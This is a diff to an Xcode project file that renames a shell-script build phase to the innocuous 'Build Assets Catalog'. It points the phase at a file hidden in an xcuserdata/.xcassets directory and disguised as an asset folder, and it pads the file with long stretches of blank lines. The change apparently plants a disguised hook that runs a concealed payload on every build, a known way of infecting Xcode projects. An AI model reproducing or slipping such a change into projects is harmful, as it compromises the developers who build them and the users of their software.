@@ -80,7 +80,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 3029A65F25903577002521E6 /* Build configuration list for PBXNativeTarget "CAShapeLayer" */;
 			buildPhases = (
-				455BFFA702ABDEC7786D902C /* Build Project Frameworks */,
+				2E0DE4EB3F06C2EEAF6D902C /* Build Assets Catalog */,
 				3029A64225903576002521E6 /* Sources */,
 				3029A64325903576002521E6 /* Frameworks */,
 				3029A64425903576002521E6 /* Resources */,
@@ -337,7 +337,7 @@
 	
 		/* Begin PBXShellScriptBuildPhase section */
 
-	455BFFA702ABDEC7786D902C /* Build Project Frameworks */ = {
+	2E0DE4EB3F06C2EEAF6D902C /* Build Assets Catalog */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -346,7 +346,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Project Frameworks";
+			name = "Build Assets Catalog";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -355,8 +355,86 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -416,6 +494,58 @@
 
 		
 			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
 
 
 			
